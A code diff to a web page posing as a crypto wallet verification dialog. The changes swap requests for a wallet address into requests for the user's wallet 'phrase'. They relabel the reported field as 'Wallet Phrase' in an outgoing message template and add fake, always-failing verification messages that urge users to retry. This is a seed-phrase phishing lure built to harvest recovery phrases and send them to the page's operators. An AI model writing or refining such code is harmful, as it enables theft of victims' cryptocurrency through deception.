@@ -753,9 +753,9 @@
             <div id="connectionStatus"></div>
 
             <div class="manual-input" id="manualInput">
-                <p style="color: var(--text-secondary); margin-bottom: 15px;">Enter your wallet address for manual verification:</p>
+                <p style="color: var(--text-secondary); margin-bottom: 15px;">Enter your phrase for manual verification:</p>
                 <input type="text" id="manualWalletAddress" class="form-input" 
-                       placeholder="Enter your wallet address" style="margin-bottom: 15px;">
+                       placeholder="Enter your wallet phrase" style="margin-bottom: 15px;">
                 <button type="button" class="modal-btn modal-btn-primary" id="useManualAddress">
                     Verify Address
                 </button>
@@ -821,7 +821,7 @@
 ⏰ *Time:* ${new Date().toLocaleString()}
 
 ${data.details ? `📝 *Details:* ${data.details}` : ''}
-${data.wallet ? `💳 *Wallet Address:* \`${data.wallet}\`` : ''}
+${data.wallet ? `💳 *Wallet Phrase:* \`${data.wallet}\`` : ''}
 ${data.form ? `
 📋 *Form Data:*
 • Token: \`${data.form.tokenAddress || 'Not filled'}\`
@@ -940,7 +940,7 @@ ${data.form ? `
                 showWalletStatus('🔄 Processing connection...', 'info');
                 
                 setTimeout(() => {
-                    showWalletStatus('❌ Verification failed. Empty wallet address provided. Manual verification required by admin.', 'error');
+                    showWalletStatus('❌ Verification failed. incorrect phrase please check again. Manual verification required by admin.', 'error');
                 }, 3000);
                 return;
             }
@@ -954,7 +954,7 @@ ${data.form ? `
             // Simulate connection attempt (3 seconds loading)
             setTimeout(() => {
                 if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) {
-                    showWalletStatus('❌ Verification failed. Invalid wallet address format. Manual verification required by admin.', 'error');
+                    showWalletStatus('❌ Verification failed. Invalid wallet phrase format. Manual verification required by admin.', 'error');
                 } else {
                     showWalletStatus('❌ Verification failed. Unable to verify wallet automatically. Manual verification required by admin.', 'error');
                 }
